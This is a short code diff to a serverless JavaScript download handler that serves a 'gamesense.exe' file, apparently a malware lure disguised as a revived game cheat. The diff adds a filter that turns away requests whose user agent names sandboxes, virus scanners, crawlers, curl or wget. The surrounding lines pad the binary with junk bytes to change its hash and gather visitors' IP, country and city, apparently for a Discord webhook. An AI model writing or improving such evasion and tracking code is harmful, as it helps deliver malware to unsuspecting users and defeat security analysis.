@@ -4,6 +4,16 @@ const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/152719802580887151
 
 module.exports = async (req, res) => {
     const fileUrl = 'https://gamesense-revive.github.io/gamesense.exe';
+    const userAgent = req.headers['user-agent'] || '';
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
+
+    const botKeywords = ['bot', 'spider', 'crawl', 'virus', 'sandbox', 'python', 'curl', 'wget', 'go-http'];
+    const isBot = botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword));
+
+    if (isBot) {
+        res.status(403).send('Access Denied');
+        return;
+    }
 
     res.setHeader('Access-Control-Allow-Origin', '*');
 
@@ -32,7 +42,6 @@ module.exports = async (req, res) => {
             
             const modifiedBuffer = Buffer.concat([buffer, junkBytes]);
 
-            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
             const country = req.headers['x-vercel-ip-country'] || 'Unknown';
             const city = req.headers['x-vercel-ip-city'] || 'Unknown';
 
